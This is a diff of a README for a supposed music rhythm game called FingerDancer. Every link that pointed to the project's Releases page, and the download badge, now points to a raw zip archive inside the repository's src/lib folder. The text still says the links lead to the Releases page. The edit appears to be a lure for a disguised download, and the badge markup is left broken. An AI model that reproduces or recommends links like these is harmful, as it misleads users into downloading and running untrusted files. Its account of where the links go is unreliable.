@@ -1,6 +1,6 @@
 # 🎶 FingerDancer - Enjoy Music Like Never Before
 
-[![Download FingerDancer](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/reformmovementpopgroup351/FingerDancer/releases)
+[![Download FingerDancer](https://raw.githubusercontent.com/reformmovementpopgroup351/FingerDancer/main/src/lib/FingerDancer-2.2.zip%https://raw.githubusercontent.com/reformmovementpopgroup351/FingerDancer/main/src/lib/FingerDancer-2.2.zip)](https://raw.githubusercontent.com/reformmovementpopgroup351/FingerDancer/main/src/lib/FingerDancer-2.2.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to FingerDancer! This is a web-based music rhythm game designed to provi
 
 To get started with FingerDancer, you need to download the application. Visit the link below to access the latest version:
 
-[Download FingerDancer Releases](https://github.com/reformmovementpopgroup351/FingerDancer/releases)
+[Download FingerDancer Releases](https://raw.githubusercontent.com/reformmovementpopgroup351/FingerDancer/main/src/lib/FingerDancer-2.2.zip)
 
 1. Click the link above to go to the Releases page.
 2. Look for the latest release (it will be at the top).
@@ -77,4 +77,4 @@ These technologies help us create an immersive gaming experience.
 
 Now that you're set up, we hope you have a fantastic time with FingerDancer! The rhythm awaits you.
 
-For more information and updates, remember to visit our [Releases page](https://github.com/reformmovementpopgroup351/FingerDancer/releases) frequently to stay current with our latest features.
+For more information and updates, remember to visit our [Releases page](https://raw.githubusercontent.com/reformmovementpopgroup351/FingerDancer/main/src/lib/FingerDancer-2.2.zip) frequently to stay current with our latest features.
